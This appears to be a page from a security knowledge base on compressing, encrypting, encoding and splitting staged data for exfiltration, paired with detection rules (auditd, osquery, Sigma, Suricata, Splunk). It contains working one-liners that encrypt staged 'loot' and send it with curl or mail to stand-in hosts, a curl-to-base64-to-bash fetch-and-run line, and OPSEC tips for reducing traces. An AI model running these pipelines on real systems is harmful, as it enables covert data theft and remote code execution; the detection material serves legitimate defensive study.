# Encoding, Compression & Encryption for Transfer

*The data-preparation layer between staging and transport, and an honest accounting of the telemetry each step emits. Encoding never hides data - it expands it and stamps it with a recognizable charset that defenders match on.*

Related pages: [Exfil principles & staging](01-exfil-principles-and-staging.md) |
[DNS tunneling](03-dns-tunneling.md) | [HTTPS & cloud](04-https-and-cloud-exfil.md) |
[base64 & encoding telemetry deep-dive](../detection-mapping/base64-and-encoding-telemetry.md)

## What & why

The goal is to turn staged loot into a blob that survives the chosen transport channel without
corruption and resists casual inspection. The canonical pipeline is:
`compress -> encrypt -> (optionally encode) -> split -> transport`.
Compression shrinks volume; encryption makes the payload opaque to content inspection; encoding
makes binary data safe over text-only channels. The trap is believing any of this makes you
quieter on the host or the wire. Compression and encryption raise output entropy toward 8.0
bits/byte - a value that DLP engines and IDS entropy heuristics flag. Encoding adds a
recognizable alphabet and inflates size ~33%. None of it removes the process, file-write, or
network artifacts the preparation generates.

## Technique

### Order of operations

Compress before encrypting. Encryption produces near-random output that does not compress.
Reversing the order wastes the compression entirely.

```bash
# compress -> encrypt (lab passphrase only)
tar -C /tmp/stage -czf - . \
  | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:LAB_PASSPHRASE \
  > /dev/shm/blob.enc

# decrypt + extract on operator host
openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:LAB_PASSPHRASE -in blob.enc \
  | tar -xzf - -C ./out/
```

Prefer `age` (https://age-encryption.org) for modern key-based encryption:

```bash
# encrypt to a recipient public key - no passphrase in process args
tar -C /tmp/stage -czf - . | age -r age1ql3z7hjy... > /dev/shm/blob.age
```

`age` avoids the passphrase-in-argv problem (visible to `ps`, auditd, EDR).

### Compression

```bash
# gzip via tar (default, widely available)
tar -czf /dev/shm/stage.tar.gz /tmp/stage/

# zstd - faster, comparable ratio
tar -I zstd -cf /dev/shm/stage.tar.zst /tmp/stage/

# xz - best ratio, slow - for size-sensitive channels
tar -Jcf /dev/shm/stage.tar.xz /tmp/stage/
```

The artifact: a new file in /dev/shm or /tmp, an auditd `open(O_WRONLY|O_CREAT)` + `write`
record, and an EDR file-creation event. `/dev/shm` is tmpfs - no disk write, no inode in
`/tmp` - but it is still visible to auditd and EDR kernel hooks.

### Encoding for transport

Encoding is needed only when the channel is text-only: DNS labels, JSON fields, HTTP headers,
copy-paste over a terminal. On an already-encrypted HTTPS channel the payload is binary-safe
and encoding is unnecessary noise.

**base64** - the most common, the most heavily logged:

```bash
# pipe into curl without a staging file
tar -czf - /tmp/stage/ | openssl enc -aes-256-cbc -pbkdf2 -pass pass:LAB | base64 -w0 \
  | curl -s -X POST -d @- https://203.0.113.10/recv

# decode on operator side
cat received.b64 | base64 -d | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:LAB | tar -xzf -
```

**base32** - used in DNS labels (63-char limit per label, only `[A-Z2-7=]` uppercase-safe):

```bash
echo -n "small secret" | base32   # ONSWG4TFONZWK3DTMVWGKZLE
```

**hex / xxd** - useful when only hex chars are allowed:

```bash
xxd -p /tmp/small.bin | tr -d '\n'
xxd -p -r <<< "deadbeef..."
```

**uuencode** - legacy, found in mail/NNTP flows:

```bash
uuencode /tmp/blob.enc blob.enc | mail -s x ops@192.0.2.1
```

### Splitting large blobs

```bash
# split into 10 MB chunks
split -b 10M /dev/shm/blob.enc /dev/shm/chunk_

# reassemble
cat /dev/shm/chunk_* > blob.enc
```

Each chunk file is a separate disk artifact and a separate file-create event.

### The decode-and-execute anti-pattern

```bash
# THIS IS THE LOUDEST POSSIBLE PATTERN - heavily signatured
curl https://192.0.2.1/payload | base64 -d | bash
echo "aGVsbG8=" | base64 -d | sh
```

Both lines produce: shell history entry, auditd execve record for `base64` with full argv,
a `base64->sh` or `curl->base64->sh` process tree that EDR and Falco flag by name, and on
the wire a base64 string that Suricata content rules and proxy DLP match. See dedicated
section below and the deep-dive companion page.

### Quieter alternative

Encrypt to opaque bytes and send them inside an already-encrypted channel (HTTPS/TLS). No
base64, no recognizable charset, no size inflation. The entropy tell remains (high-entropy
blob in HTTP body) but content-match and charset heuristics do not apply.

```bash
# in-memory: compress + encrypt + POST without touching disk or encoding
tar -czf - /tmp/stage/ \
  | age -r age1ql3z7hjy... \
  | curl -s --data-binary @- https://203.0.113.10/recv
```

## OPSEC notes

- `base64` in a pipeline is fully visible in auditd execve and EDR. The argv shows the
  pipe structure. Shell history keeps the one-liner.
- `/dev/shm` avoids disk I/O but does NOT avoid kernel-level file-open/write hooks.
- Large staging files trigger disk-usage anomalies and DLP file-size thresholds.
- The passphrase in `openssl enc -pass pass:...` appears in `/proc/PID/cmdline` and in
  auditd proctitle records while the process runs. Use key files or `age` with key files
  instead.
- High-entropy output (encrypted/compressed blobs) in HTTP bodies is itself a DLP/IDS
  signal even when the content cannot be decoded.
- `base32` in DNS labels is visible as high-entropy, long subdomain strings in DNS query
  logs - see [DNS tunneling](03-dns-tunneling.md).
- Splitting into fixed-size chunks produces a regular pattern (same size, repeated writes)
  that volume analytics detect.

## Detection & telemetry

### Host - process/file

| Signal | Source | Detail |
|---|---|---|
| `base64`/`base32`/`xxd` process spawn | auditd `execve`, EDR process event | Full argv including pipeline captured. Parent: bash, sh, zsh. |
| `base64 -d` piped to shell | auditd, EDR, Falco | Process tree: `sh -> base64 -> sh` or `curl -> base64 -> sh`. Rule name: "base64 decode piped to shell". |
| Passphrase in cmdline | auditd `proctitle` | `openssl enc ... -pass pass:SECRET` visible in `/proc/PID/cmdline` during process lifetime. |
| Large file create in `/tmp` or `/dev/shm` | auditd `open(O_CREAT)`, EDR file event | Staging archives. Watch for files >10 MB in temp paths. |
| Archive creation burst | EDR, auditd | Many `write` syscalls to a single fd in short window = archiving behavior. |

**auditd rule to catch base64 execution:**

```
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k base64_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
```

**osquery - recent base64/xxd/uuencode executions:**

```sql
SELECT p.pid, p.name, p.cmdline, p.parent, p.start_time
FROM processes p
WHERE p.name IN ('base64','base32','xxd','uuencode','openssl')
  AND p.start_time > (strftime('%s','now') - 3600);
```

**Sigma-style rule - decode and execute:**

```yaml
title: base64 Decode Piped to Shell
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'base64 -d'
      - 'base64 --decode'
  pipe_to_shell:
    CommandLine|contains:
      - '| sh'
      - '| bash'
      - '| python'
  condition: selection and pipe_to_shell
```

### Network - on the wire

| Signal | Source | Detail |
|---|---|---|
| Long base64 string in HTTP body/URL | Suricata/Snort `content`, proxy DLP | `[A-Za-z0-9+/]{60,}={0,2}` in POST body or query param. |
| High Shannon entropy in HTTP body | DLP engine, IDS entropy scoring | Encrypted/compressed blobs score near 8.0 bits/byte. |
| Large upload asymmetry | NetFlow/IPFIX | Outbound bytes >> inbound bytes on a session. |
| base64 in DNS label | DNS query log, Zeek dns.log | Label length >30 chars, charset `[A-Z2-7]` for base32 or `[A-Za-z0-9+/]` for base64. |

**Suricata content match concept for base64 in HTTP POST:**

```
alert http any any -> any any (
  msg:"base64 encoded blob in HTTP POST body";
  flow:established,to_server;
  http.method; content:"POST";
  http.request_body;
  pcre:"/[A-Za-z0-9+\/]{80,}={0,2}/";
  threshold:type limit,track by_src,count 1,seconds 60;
  sid:9000001; rev:1;
)
```

**Splunk - long base64 strings in proxy/web logs:**

```spl
index=proxy OR index=web
| eval b64_match=match(uri_query."."cs_uri_stem."."cs_post_body, "[A-Za-z0-9+/]{60,}={0,2}")
| where b64_match=1
| stats count by src_ip, dest_host, uri_stem
```

### The core lesson

`base64` is encoding, not encryption. It inflates size ~33%, stamps the data with a
recognizable `[A-Za-z0-9+/]+=*` charset, and is reversed by any analyst in one command.
Using it on a transfer operation raises signal rather than lowering it. The decode-and-execute
chain (`| base64 -d | sh`) is one of the most-signatured patterns across Sigma, Falco, and
commercial EDR. The Windows equivalents (`certutil -decode`, PowerShell `-EncodedCommand`) are
equally flagged. Full treatment: [base64 & encoding telemetry](../detection-mapping/base64-and-encoding-telemetry.md).

## MITRE ATT&CK

- **T1560.001** - Archive Collected Data: Archive via Utility (tar, gzip, zip)
- **T1027** - Obfuscated Files or Information (encoding/encoding to evade content inspection)
- **T1027.003** - Steganography (encoding within protocol fields)
- **T1132** - Data Encoding
- **T1132.001** - Data Encoding: Standard Encoding (base64, base32, hex)
- **T1048** - Exfiltration Over Alternative Protocol (when encoding enables DNS/other channel)

## References

- MITRE ATT&CK T1132 Data Encoding: https://attack.mitre.org/techniques/T1132/
- MITRE ATT&CK T1560 Archive Collected Data: https://attack.mitre.org/techniques/T1560/
- age encryption tool: https://age-encryption.org / https://github.com/FiloSottile/age
- auditd man page and audit.rules(7): https://man7.org/linux/man-pages/man8/auditd.8.html
- Sigma rule repository (detect base64 patterns): https://github.com/SigmaHQ/sigma
- Suricata rule writing guide: https://docs.suricata.io/en/latest/rules/
- GTFOBins - base64: https://gtfobins.github.io/gtfobins/base64/
- osquery process_events table: https://osquery.io/schema/current/#process_events
